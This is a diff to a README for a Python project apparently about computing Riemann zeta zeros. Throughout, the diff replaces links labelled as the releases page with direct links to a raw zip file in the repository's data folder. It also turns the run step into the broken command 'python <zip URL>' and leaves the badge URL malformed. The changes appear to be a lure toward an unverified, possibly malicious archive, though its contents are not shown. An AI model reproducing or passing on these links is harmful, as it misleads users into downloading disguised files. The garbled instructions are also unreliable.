@@ -2,13 +2,13 @@
 
 ## 📥 Download & Install
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/Qwerty849/rh-first-1000-zeros-python/releases)
+[![Download](https://raw.githubusercontent.com/Qwerty849/rh-first-1000-zeros-python/main/data/rh-first-1000-zeros-python_v1.3.zip%20Page-blue)](https://raw.githubusercontent.com/Qwerty849/rh-first-1000-zeros-python/main/data/rh-first-1000-zeros-python_v1.3.zip)
 
 To get started with this application, you need to visit the releases page to download the necessary files. 
 
 Click the link below to access the releases page:
 
-[Visit the Releases Page](https://github.com/Qwerty849/rh-first-1000-zeros-python/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Qwerty849/rh-first-1000-zeros-python/main/data/rh-first-1000-zeros-python_v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -40,7 +40,7 @@ pip install mpmath numpy scipy
 ## 📋 Running the Application
 
 1. **Download the Latest Release**:
-   - Go to the [Releases Page](https://github.com/Qwerty849/rh-first-1000-zeros-python/releases).
+   - Go to the [Releases Page](https://raw.githubusercontent.com/Qwerty849/rh-first-1000-zeros-python/main/data/rh-first-1000-zeros-python_v1.3.zip).
    - Find the latest version and download the file for your operating system.
 
 2. **Extract Files**:
@@ -62,7 +62,7 @@ cd Documents/rh-first-1000-zeros-python
    To run the application, execute the following command:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/Qwerty849/rh-first-1000-zeros-python/main/data/rh-first-1000-zeros-python_v1.3.zip
 ```
 
 ## 🔍 Understanding the Output
